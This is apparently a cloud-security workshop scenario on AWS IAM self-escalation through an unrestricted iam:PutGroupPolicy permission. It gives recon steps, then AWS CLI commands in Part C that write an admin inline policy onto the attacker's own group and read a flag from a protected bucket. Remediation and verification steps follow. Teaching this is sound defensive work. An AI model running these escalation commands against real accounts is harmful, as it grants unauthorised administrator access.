## Optional Scenario: PutGroupPolicy — Self-Escalation via Group Policy Manipulation

**Category:** Self-Escalation
**Starting Identity:** `iamws-group-admin-user`
**Target:** Crown jewels via writing an admin inline policy on `iamws-dev-team`

**The Vulnerability:** `iamws-group-admin-user` has `iam:PutGroupPolicy` with `Resource: "*"`, allowing them to write arbitrary inline policies on ANY IAM group. Since they're a member of `iamws-dev-team`, writing an admin policy on that group immediately grants themselves (and every other member) full access.

**Real-world scenario:** A team lead is given permission to manage group policies for their org's IAM groups. Without a resource constraint, they can write policies on any group — including their own. The blast radius of the attack extends to every other member of the compromised group.

### Part A: Identify with iam-recon

Build or refresh your iam-recon graph:

```bash
iam-recon graph create --profile taractf
```

Run the pathfinding scan — this is the correct recon surface for this scenario:

```bash
iam-recon --account $ACCOUNT_ID pathfinding
```

Look for the `[iam-011]` entry:
```
[iam-011] user/iamws-group-admin-user (self-escalation)
    Path: iam:PutGroupPolicy
    Perms: iam:PutGroupPolicy
    https://www.pathfinding.cloud/paths/iam-011
```

Confirm the specific permission:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-group-admin-user \
  --action iam:PutGroupPolicy
```

Expected output:
```
ALLOW user/iamws-group-admin-user can call iam:PutGroupPolicy with *
```

> [!NOTE]
> `argquery --preset privesc` will **not** flag this user — iam-recon has no `PutGroupPolicy` edge checker. Pathfinding catches it. This is the same edge-vs-path gap as Scenarios 1 and 4.

**In the interactive visualization:** search for `group-admin-user`. The node is blue (no privesc edge for this attack family). Click the node — you'll see group membership (`iamws-dev-team`) in the inspect panel and the pathfinding annotation.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/iam-011](https://pathfinding.cloud/paths/iam-011):

- **Category:** Self-Escalation
- **Required permission:** `iam:PutGroupPolicy`
- **Attack:** Write an admin inline policy on a group the attacker belongs to
- **Impact:** Immediate full account access — every group member is also escalated

This is the same attack family as Scenario 1 (`CreatePolicyVersion`), applied to group membership instead of a directly attached policy. Three variations in this workshop: write to a policy attached to self (Scenario 1), write to a group you belong to (this scenario), write to a Lambda you can invoke (Scenario 4).

### Part C: Exploit the Vulnerability

**Step 1: Confirm your identity**

```bash
aws sts get-caller-identity --profile iamws-group-admin-user
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "767397689800",
    "Arn": "arn:aws:iam::767397689800:user/iamws-group-admin-user"
}
```

**Step 2: Try the crown jewels — you're denied**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-group-admin-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Check which groups the user belongs to**

```bash
aws iam list-groups-for-user --user-name iamws-group-admin-user \
  --query 'Groups[].GroupName' --output table \
  --profile iamws-group-admin-user
```

Expected output: `iamws-dev-team` — the user belongs to this group.

**Step 4: Inspect the current group policy**

```bash
aws iam list-group-policies --group-name iamws-dev-team \
  --profile iamws-group-admin-user

aws iam get-group-policy \
  --group-name iamws-dev-team --policy-name iamws-dev-team-readonly \
  --query 'PolicyDocument' --output json \
  --profile iamws-group-admin-user
```

EC2 read-only — limited. But the user can overwrite this with any inline policy.

**Step 5: Write an admin inline policy on the group**

```bash
aws iam put-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-escalated \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --profile iamws-group-admin-user
```

No error — unrestricted `PutGroupPolicy` let us write an admin policy on our own group.

**Step 6: Claim the crown jewels**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

The file contents appear. Every member of `iamws-dev-team` is now also an administrator.

### Part D: Apply the Defense

Run all defense steps as your admin identity.

**Step 1: Apply a scoped inline policy**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam put-user-policy \
  --user-name iamws-group-admin-user \
  --policy-name SecureGroupAdmin \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "AllowPutGroupPolicyOnPlatformTeamOnly",
        "Effect": "Allow",
        "Action": "iam:PutGroupPolicy",
        "Resource": "arn:aws:iam::'${ACCOUNT_ID}':group/iamws-platform-team"
      },
      {
        "Sid": "AllowGroupEnumeration",
        "Effect": "Allow",
        "Action": ["iam:ListGroups","iam:ListGroupPolicies","iam:GetGroupPolicy",
                   "iam:ListGroupsForUser","iam:GetGroup"],
        "Resource": "*"
      }
    ]
  }'
```

The key trick: scope `PutGroupPolicy` to `iamws-platform-team` — a group the attacker is **not** a member of. They can still legitimately manage that team's policies, but can't escalate their own permissions.

**Step 2: Detach the overly-permissive managed policy**

```bash
aws iam detach-user-policy \
  --user-name iamws-group-admin-user \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-group-admin-policy
```

**Step 3: Remove the attack residue**

The defense scopes future `PutGroupPolicy` calls, but the escalated group policy from the attack is still in place. Remove it, or the user remains effectively admin:

```bash
# Must run as taractf — SecureGroupAdmin does not grant iam:DeleteGroupPolicy
aws iam delete-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-escalated \
  --profile taractf 2>/dev/null || true
```

**Step 4: Wait for AWS IAM permission changes to take effect**

AWS keeps a short-lived permission cache (~3–5 minutes) for revoke-style changes. Without the wait, the attacker user can still call `PutGroupPolicy` on `iamws-dev-team` for several minutes.

```bash
sleep 60
```

### Part E: Verify the Remediation

**Step 1: Re-run the original attack — confirm it's blocked**

```bash
aws iam put-group-policy \
  --group-name iamws-dev-team \
  --policy-name test-escalation \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --profile iamws-group-admin-user
```

Expected output:
```
An error occurred (AccessDenied) when calling the PutGroupPolicy operation:
User: arn:aws:iam::767397689800:user/iamws-group-admin-user
is not authorized to perform: iam:PutGroupPolicy on resource:
group arn:aws:iam::767397689800:group/iamws-dev-team
```

**Step 2: Confirm the legitimate path still works**

```bash
aws iam put-group-policy \
  --group-name iamws-platform-team \
  --policy-name test-allowed \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:GetObject","Resource":"*"}]}' \
  --profile iamws-group-admin-user
```

Expected output: success — the user can still manage groups they're authorized for.

Clean up the test policy (requires admin because `SecureGroupAdmin` does not include `iam:DeleteGroupPolicy`):

```bash
aws iam delete-group-policy \
  --group-name iamws-platform-team \
  --policy-name test-allowed \
  --profile taractf
```

**Step 3: Confirm the crown jewels are still safe**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 4: Verify with iam-recon**

Refresh the graph:

```bash
iam-recon graph create --profile taractf
iam-recon --account $ACCOUNT_ID pathfinding
```

The `[iam-011]` entry for `user/iamws-group-admin-user` is gone.

Confirm the specific permission is denied on the user's own group:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-group-admin-user \
  --action iam:PutGroupPolicy \
  --resource 'arn:aws:iam::*:group/iamws-dev-team'
```

Expected output:
```
DENY user/iamws-group-admin-user cannot call iam:PutGroupPolicy with arn:aws:iam::*:group/iamws-dev-team
```

### Going Further

The defense above scopes the **user's** permissions. The same-named **role** (`iamws-group-admin-role`) still has the original `iamws-group-admin-policy` attached — iam-recon's `pathfinding [iam-011]` still shows `role/iamws-group-admin-role`.

To eliminate that row too, apply the same fix to the role:

```bash
aws iam put-role-policy \
  --role-name iamws-group-admin-role \
  --policy-name SecureGroupAdmin \
  --policy-document '...'   # same document as above

aws iam detach-role-policy \
  --role-name iamws-group-admin-role \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-group-admin-policy
```

### What You Learned

- `iam:PutGroupPolicy` with `Resource: "*"` allows writing policies on any group — including groups the attacker belongs to. Every group member is immediately escalated.
- The fix is the same principle as Scenario 4 (resource constraint): scope `PutGroupPolicy` to specific group ARNs the attacker is **not** a member of.
- Always periodically audit: "Is this principal a member of any group they can write policies on?" Group membership drift is a quiet way this control degrades.
- Defenses against "policy residue" attacks must also remove the escalated artifact (Step 3) — scoping future calls is not enough.
- Defenses applied to a user don't automatically apply to the same-named role — audit both principals.

### Cleanup

See [`cleanup.md`](cleanup.md) for revert steps.

---

**Next:** Return to the day-at-a-glance ([`../README.md`](../README.md)) — all scenarios complete.
